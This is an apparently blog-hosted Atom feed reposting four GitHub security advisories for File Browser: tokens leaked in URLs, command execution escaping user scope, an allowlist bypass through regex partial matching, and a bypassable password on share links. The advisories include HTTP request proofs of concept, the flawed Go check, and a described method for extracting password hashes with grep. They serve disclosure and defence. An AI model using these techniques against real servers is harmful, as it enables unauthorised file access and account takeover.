<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>liancc&#39; infos blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-06-30T18:00:15.774Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>lianccc</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>File Browser allows sensitive data to be transferred in URL</title>
    <link href="http://example.com/2025/06/30/github_3081215336/"/>
    <id>http://example.com/2025/06/30/github_3081215336/</id>
    <published>2025-06-30T18:00:15.778Z</published>
    <updated>2025-06-30T18:00:15.774Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-rmwh-g367-mj4x">https://github.com/advisories/GHSA-rmwh-g367-mj4x</a></p><p><strong>仓库 Star：</strong> 30015</p><p><strong>CVSS 评分：</strong> 4.5</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-rmwh-g367-mj4x">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-rmwh-g367-mj4x</a></p></li><li><p><a href="https://github.com/filebrowser/filebrowser/commit/d5b39a14fd3fc0d1c364116b41289484df7c27b2">https://github.com/filebrowser/filebrowser/commit/d5b39a14fd3fc0d1c364116b41289484df7c27b2</a></p></li><li><p><a href="https://github.com/filebrowser/filebrowser/releases/tag/v2.33.9">https://github.com/filebrowser/filebrowser/releases/tag/v2.33.9</a></p></li><li><p><a href="https://github.com/advisories/GHSA-rmwh-g367-mj4x">https://github.com/advisories/GHSA-rmwh-g367-mj4x</a></p></li></ul><p><strong>描述：</strong></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>URLs that are accessed by a user are commonly logged in many locations, both server- and client-side. It is thus good practice to never transmit any secret information as part of a URL. The <em>Filebrowser</em> violates this practice, since access tokens are used as GET parameters.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>The <em>JSON Web Token (JWT)</em> which is used as a session identifier will get leaked to anyone having access to the URLs accessed by the user. This will give the attacker full access to the user’s account and, in consequence, to all sensitive files the user has access to.</p><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Sensitive information in URLs is logged by several components (see the following examples), even if access is protected by TLS.</p><ul><li>The browser history</li><li>The access logs on the affected web server</li><li>Proxy servers or reverse proxy servers</li><li>Third-party servers via the HTTP referrer header</li></ul><p>In case attackers can access certain logs, they could read the included sensitive data.</p><h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h2><p>When a file is downloaded via the web interface, the JWT is part of the URL:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/raw/testdir/testfile.txt?auth=eyJh[...]_r4EQ</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>filebrowser.local:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://filebrowser.local:8080/files/testdir/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>auth=eyJh[...]_r4EQ<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><p>This also happens when a new <em>command session</em> is started:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/command/?auth=eyJh[...]YW8BA</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>filebrowser.local:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Sec-WebSocket-Version</span><span class="hljs-punctuation">: </span>13<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://filebrowser.local:8080<br><span class="hljs-attribute">Sec-WebSocket-Key</span><span class="hljs-punctuation">: </span>oqQMrF7R34D3lAkj1+ZHTw==<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive, Upgrade<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>auth=eyJh[...]YW8BA<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Upgrade</span><span class="hljs-punctuation">: </span>websocket<br></code></pre></td></tr></table></figure><h2 id="Recommended-Countermeasures"><a href="#Recommended-Countermeasures" class="headerlink" title="Recommended Countermeasures"></a>Recommended Countermeasures</h2><p>Sensitive data like session tokens or user credentials should be transmitted via HTTP headers or the HTTP body only, never in the URL.</p><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><code>2025-03-27</code> Identified the vulnerability in version 2.32.0</li><li><code>2025-04-11</code> Contacted the project</li><li><code>2025-04-29</code> Vulnerability disclosed to the project</li><li><code>2025-06-25</code> Uploaded advisories to the project’s GitHub repository</li><li><code>2025-06-26</code> CVE ID assigned by GitHub</li><li><code>2025-06-26</code> Fix released in version 2.33.9</li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://cwe.mitre.org/data/definitions/598.html">CWE-598: Use of GET Request Method With Sensitive Query Strings</a></li></ul><h2 id="Credits"><a href="#Credits" class="headerlink" title="Credits"></a>Credits</h2><ul><li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-rmwh-g367-mj4x&quot;&gt;https://github.com/advisories/GHSA-rmwh-g367-mj4x&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>File Browser Command Execution not Limited to Scope</title>
    <link href="http://example.com/2025/06/30/github_758104067/"/>
    <id>http://example.com/2025/06/30/github_758104067/</id>
    <published>2025-06-30T18:00:14.935Z</published>
    <updated>2025-06-30T18:00:14.930Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-hc8f-m8g5-8362">https://github.com/advisories/GHSA-hc8f-m8g5-8362</a></p><p><strong>仓库 Star：</strong> 30015</p><p><strong>CVSS 评分：</strong> 8.1</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-hc8f-m8g5-8362">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-hc8f-m8g5-8362</a></p></li><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52904">https://nvd.nist.gov/vuln/detail/CVE-2025-52904</a></p></li><li><p><a href="https://github.com/filebrowser/filebrowser/issues/5199">https://github.com/filebrowser/filebrowser/issues/5199</a></p></li><li><p><a href="https://github.com/GoogleContainerTools/distroless">https://github.com/GoogleContainerTools/distroless</a></p></li><li><p><a href="https://sloonz.github.io/posts/sandboxing-1">https://sloonz.github.io/posts/sandboxing-1</a></p></li><li><p><a href="https://github.com/advisories/GHSA-hc8f-m8g5-8362">https://github.com/advisories/GHSA-hc8f-m8g5-8362</a></p></li></ul><p><strong>描述：</strong></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>In the web application, all users have a <em>scope</em> assigned, and they only have access to the files within that <em>scope</em>.<br>The <em>Command Execution</em> feature of Filebrowser allows the execution of shell commands which are not restricted to the scope, potentially giving an attacker read and write access to all files managed by the server.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>Shell commands are executed with the <em>uid</em> of the server process without any further restrictions.<br>This means, that they will have access to at least</p><ul><li>all files managed by the application from all <em>scopes</em>, even those the user does not have access to in the GUI.</li><li>the Filebrowser database file containing the password hashes of all accounts.</li></ul><p>The concrete impact depends on the commands being granted to the attacker, but due to other vulnerabilities identified (“Bypass Command Execution Allowlist”, “Shell Commands Can Spawn Other Commands”, “Insecure File Permissions”) it is likely, that full read- and write-access will exist.</p><p>Read access to the database means, that the attacker is capable of extracting all user password hashes.<br>This enables an offline dictionary attack on the passwords of all accounts, though the choice of the password hash function (<em>bcrypt</em> with a complexity of 10) gives a strong protection against such attacks.<br>Write access to the database means that attackers are capable of changing a user’s password hash, allowing them to impersonate any user account, including an administrator.</p><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>Shell commands executed by a user are created as a simple subprocess of the application without any further restrictions.<br>That means, that they have full access to files accessible by the application.<br>The <em>scope</em> that is assigned to every account is not considered.</p><p>As a prerequisite, an attacker needs an account with the <code>Execute Commands</code> permission and some permitted commands.</p><h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h2><p>Any exploit highly depends on the commands granted to the attacker.<br>The following screenshot shows, how all password hashes can be extracted using only the <code>grep</code> command:</p><p><img src="https://github.com/user-attachments/assets/a6fb98e0-2daa-4e10-8480-7963b3d9b214" alt="image"></p><h2 id="Recommended-Countermeasures"><a href="#Recommended-Countermeasures" class="headerlink" title="Recommended Countermeasures"></a>Recommended Countermeasures</h2><p>Until this issue is fixed, we recommend to completely disable <code>Execute commands</code> for all accounts.<br>Since the command execution is an inherently dangerous feature that is not used by all deployments, it should be possible to completely disable it in the application’s configuration.<br>As a defense-in-depth measure, organizations not requiring command execution should operate the Filebrowser from a <em>distroless</em> container image.</p><p>There are two approaches to fixing this issue:</p><ol><li>Limiting the process when it is started e.g., by using <em>user namespaces</em> with a tool like <em>Bubblewrap</em>. If this path is chosen, it is important to use a method that works both on a bare-metal server and within an unprivileged container.</li><li>Re-architecting the command execution feature so that file in the various <em>scopes</em> have a distinct <em>uid</em> as an owner and all shell command are executed under the <em>uid</em> of the user’s <em>scope</em>.</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><code>2025-03-26</code> Identified the vulnerability in version 2.32.0</li><li><code>2025-04-11</code> Contacted the project</li><li><code>2025-04-18</code> Vulnerability disclosed to the project</li><li><code>2025-06-25</code> Uploaded advisories to the project’s GitHub repository</li><li><code>2025-06-25</code> CVE ID assigned by GitHub</li><li><code>2025-06-25</code> A patch version has been pushed to disable the feature for all existent installations, and making it <strong>opt-in</strong>. A warning has been added to the documentation and is printed on the console if the feature is enabled. Due to the project being in maintenance-only mode, the bug has not been fixed. Fix is tracked on <a href="https://github.com/filebrowser/filebrowser/issues/5199">https://github.com/filebrowser/filebrowser/issues/5199</a>.</li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://sloonz.github.io/posts/sandboxing-1/">Sandboxing Applications with Bubblewrap: Securing a Basic Shell</a></li><li><a href="https://github.com/GoogleContainerTools/distroless">“Distroless” Container Images.</a></li></ul><h2 id="Credits"><a href="#Credits" class="headerlink" title="Credits"></a>Credits</h2><ul><li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-hc8f-m8g5-8362&quot;&gt;https://github.com/advisories/GHSA-hc8f-m8g5-8362&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>File Browser vulnerable to command execution allowlist bypass</title>
    <link href="http://example.com/2025/06/30/github_2598148468/"/>
    <id>http://example.com/2025/06/30/github_2598148468/</id>
    <published>2025-06-30T18:00:13.590Z</published>
    <updated>2025-06-30T18:00:13.586Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-w7qc-6grj-w7r8">https://github.com/advisories/GHSA-w7qc-6grj-w7r8</a></p><p><strong>仓库 Star：</strong> 30015</p><p><strong>CVSS 评分：</strong> 8.1</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-w7qc-6grj-w7r8">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-w7qc-6grj-w7r8</a></p></li><li><p><a href="https://github.com/filebrowser/filebrowser/commit/4d830f707fc4314741fd431e70c2ce50cd5a3108">https://github.com/filebrowser/filebrowser/commit/4d830f707fc4314741fd431e70c2ce50cd5a3108</a></p></li><li><p><a href="https://github.com/filebrowser/filebrowser/releases/tag/v2.33.10">https://github.com/filebrowser/filebrowser/releases/tag/v2.33.10</a></p></li><li><p><a href="https://github.com/advisories/GHSA-w7qc-6grj-w7r8">https://github.com/advisories/GHSA-w7qc-6grj-w7r8</a></p></li></ul><p><strong>描述：</strong></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>The <em>Command Execution</em> feature of Filebrowser only allows the execution of shell command which have been predefined on a user-specific allowlist. The implementation of this allowlist is erroneous, allowing a user to execute additional commands not permitted.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>A user can execute more shell commands than they are authorized for. The concrete impact of this vulnerability depends on the commands configured, and the binaries installed on the server or in the container image. Due to the missing separation of <em>scopes</em> on the OS-level, this could give an attacker access to all files managed the application, including the File Browser database.</p><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>For a user to make use of the command execution feature, two things need to happen in advance:</p><ol><li>An administrator needs to grant that account the <code>Execute commands</code> permission</li><li>The command to be executed needs to be listed in the <code>Commands</code> input field (also done by an administrator)</li></ol><p>If a user tries to execute a different command, it gets rejected by the application.</p><p>The allowlist verification of a command happens in the function <code>CanExecute</code> in the file <code>users/users.go</code>:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// CanExecute checks if an user can execute a specific command.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u *User)</span></span> CanExecute(command <span class="hljs-type">string</span>) <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">if</span> !u.Perm.Execute &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><br><span class="hljs-keyword">for</span> _, cmd := <span class="hljs-keyword">range</span> u.Commands &#123;<br><span class="hljs-keyword">if</span> regexp.MustCompile(cmd).MatchString(command) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>This check employs a regular expression which does not test if the command issued (<code>command</code>) is identical to a configured one (<code>cmd</code>, part of the array <code>u.Commands</code>) but rather only if the issued command contains an allowed one.<br>This has the consequence, that, e.g., if you are only granted access to the <code>ls</code> command, you will also be allowed to execute <code>lsof</code> and <code>lsusb</code>.</p><p>As a prerequisite, an attacker needs an account with the <code>Execute Commands</code> permission and some permitted commands.</p><h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h2><p>Grant a user the <code>Execute commands</code> permission and allow them to use only <code>ls</code> in the <code>Commands</code> field.</p><p><img src="https://github.com/user-attachments/assets/30b84315-16bd-4b8f-ba30-2a395c89f002" alt="image"></p><p>Afterwards, login as that user, open a command execution window and execute <code>lsof</code> and <code>lsusb</code>.</p><p><img src="https://github.com/user-attachments/assets/f40baf90-832e-4ced-a596-bc75cf691549" alt="image"></p><h2 id="Recommended-Countermeasures"><a href="#Recommended-Countermeasures" class="headerlink" title="Recommended Countermeasures"></a>Recommended Countermeasures</h2><p>The <code>CanExecute</code> function in the <em>Filebrowser</em> source code should be fixed to only allow exact matches of the command specified instead of doing partial matching.<br>The correctness of this fix should be extensively tested in the application’s automated test suite.</p><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><code>2025-03-25</code> Identified the vulnerability in version 2.32.0</li><li><code>2025-04-11</code> Contacted the project</li><li><code>2025-04-18</code> Vulnerability disclosed to the project</li><li><code>2025-06-25</code> Uploaded advisories to the project’s GitHub repository</li><li><code>2025-06-25</code> CVE ID assigned by GitHub</li><li><code>2025-06-26</code> Fix released in version 2.33.10</li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><h2 id="Credits"><a href="#Credits" class="headerlink" title="Credits"></a>Credits</h2><ul><li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-w7qc-6grj-w7r8&quot;&gt;https://github.com/advisories/GHSA-w7qc-6grj-w7r8&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>File Browser&#39;s password protection of links is bypassable</title>
    <link href="http://example.com/2025/06/30/github_62532549/"/>
    <id>http://example.com/2025/06/30/github_62532549/</id>
    <published>2025-06-30T18:00:12.574Z</published>
    <updated>2025-06-30T18:00:12.570Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-3v48-283x-f2w4">https://github.com/advisories/GHSA-3v48-283x-f2w4</a></p><p><strong>仓库 Star：</strong> 30015</p><p><strong>CVSS 评分：</strong> 3.1</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-3v48-283x-f2w4">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-3v48-283x-f2w4</a></p></li><li><p><a href="https://github.com/filebrowser/filebrowser/issues/5239">https://github.com/filebrowser/filebrowser/issues/5239</a></p></li><li><p><a href="https://github.com/advisories/GHSA-3v48-283x-f2w4">https://github.com/advisories/GHSA-3v48-283x-f2w4</a></p></li></ul><p><strong>描述：</strong></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Files managed by the <em>File Browser</em> can be shared with a link to external persons. While the application allows protecting those links with a password, the implementation is error-prone, making an incidental unprotected sharing of a file possible.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>File owners might rest in the assumption that their shared files are only accessible to persons knowing the defined password, giving them a false sense of security. Meanwhile, attackers gaining access to the unprotected link can use this information alone to download the possibly sensitive file.</p><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>When sharing a file, the user is presented with a dialog asking for an optional password to protect the file share. The assumption of the user at this point would be, that the shared file won’t be accessible without knowledge of the password. After clicking on <code>SHARE</code> the following dialog opens allowing the file’s owner to copy the share-link:</p><p><img src="https://github.com/user-attachments/assets/f3add074-40ac-4367-a538-ede5bb526916" alt="image"></p><p>In fact, there is not one, but two links offered: A <code>Download Link</code> and an unnamed second one. They have the following format:</p><ul><li><a href="http://filebrowser.local:8080/share/6Gtw0xAw">http://filebrowser.local:8080/share/6Gtw0xAw</a></li><li><a href="http://filebrowser.local:8080/api/public/dl/6Gtw0xAw/dummy1.pdf?token=voDK6j%5B...%5D">http://filebrowser.local:8080/api/public/dl/6Gtw0xAw/dummy1.pdf?token=voDK6j[...]</a></li></ul><p>Apparently, the first of the two share links is that one that users are supposed to actually share, while the second one is a direct download link not protected by the password. This behavior is not documented anywhere or explained in the GUI, though.</p><p>There are multiple scenarios how an attacker might gain access to the unprotected link and, in consequence, to the shared file:</p><ul><li>The file owner might incidentally share the second link instead of the first one, making it accessible to anyone having read access to the messaging system used (e.g., a mailserver).</li><li>After the legitimate receiver of the share has used the password, the unprotected link will get linked in multiple locations like the browser history or the log of a proxy server used.</li></ul><h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h2><p>Using the first link results in an authorization error if no password is provided, as expected:</p><figure class="highlight http"><figcaption><span>hl:9</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/public/share/6Gtw0xAw</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>filebrowser.local:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://filebrowser.local:8080/share/6Gtw0xAw<br><span class="hljs-attribute">X-Auth</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">X-SHARE-PASSWORD</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-GPC</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=4<br><br><span class="language-http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">401</span> Unauthorized</span><br><span class="language-http"><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache, no-store, must-revalidate</span><br><span class="language-http"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span>default-src &#x27;self&#x27;; style-src &#x27;unsafe-inline&#x27;;</span><br><span class="language-http"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/plain; charset=utf-8</span><br><span class="language-http"><span class="hljs-attribute">X-Content-Type-Options</span><span class="hljs-punctuation">: </span>nosniff</span><br><span class="language-http"><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Thu, 27 Mar 2025 10:59:12 GMT</span><br><span class="language-http"><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>17</span><br><span class="language-http"></span><br><span class="language-http"><span class="language-basic"><span class="hljs-symbol">401 </span>Unauthorized</span></span><br></code></pre></td></tr></table></figure><p>Only if the password is provided (via the <code>X-SHARE-PASSWORD</code> header), a proper response is given:</p><figure class="highlight http"><figcaption><span>hl:9</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/public/share/6Gtw0xAw</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>filebrowser.local:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://filebrowser.local:8080/share/6Gtw0xAw<br><span class="hljs-attribute">X-Auth</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">X-SHARE-PASSWORD</span><span class="hljs-punctuation">: </span>1234<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-GPC</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK</span><br><span class="language-http"><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache, no-store, must-revalidate</span><br><span class="language-http"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span>default-src &#x27;self&#x27;; style-src &#x27;unsafe-inline&#x27;;</span><br><span class="language-http"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json; charset=utf-8</span><br><span class="language-http"><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Thu, 27 Mar 2025 10:59:15 GMT</span><br><span class="language-http"><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>301</span><br><span class="language-http"></span><br><span class="language-http"><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dummy1.pdf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;size&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">7703</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;extension&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;.pdf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;modified&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;2025-03-27T15:11:45.101242449Z&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;mode&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">420</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;isDir&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;isSymlink&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><span 